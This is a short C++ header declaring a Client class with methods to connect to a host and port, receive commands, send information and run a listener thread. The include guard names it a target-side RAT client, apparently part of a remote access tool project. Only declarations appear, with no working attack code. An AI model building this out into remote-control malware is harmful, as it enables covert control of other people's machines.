//
// Created by Dmitri on 2026-10-26.
//

#ifndef RAT_TARGET_CLIENT_H
#define RAT_TARGET_CLIENT_H
#include <string>
#include <atomic>
#include <thread>

class Client {
public:
    ~Client();

    bool ReceiveCommand(std::string& command);
    bool Connect(std::string& host, std::string& port);
    void Listen();
    void Send(std::string& info);
    void Disconnect();
    bool isConnected();

private:
    void ReceiveLoop();

    int sock = -1;
    std::atomic<bool> connected{false};
    std::thread listener;
};


#endif //RAT_TARGET_CLIENT_H
